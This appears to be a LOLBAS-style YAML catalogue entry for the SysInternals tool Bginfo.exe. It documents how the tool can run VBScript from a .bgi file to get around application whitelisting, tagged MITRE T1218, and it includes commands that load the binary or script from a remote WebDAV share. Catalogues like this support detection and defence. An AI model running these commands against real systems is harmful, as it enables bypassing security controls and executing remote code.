---
Name: Bginfo.exe
Description: Background Information Utility included with SysInternals Suite
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
    Usecase: Local execution of VBScript
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
    Usecase: Local execution of VBScript
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: Execute bginfo.exe from a WebDAV server.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: Execute bginfo.exe from a WebDAV server.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: This style of execution may not longer work due to patch.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: This style of execution may not longer work due to patch.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
Full_Path:
  - Path: No fixed path
Code_Sample:
  - Code:
Detection:
  - IOC:
Resources:
  - Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
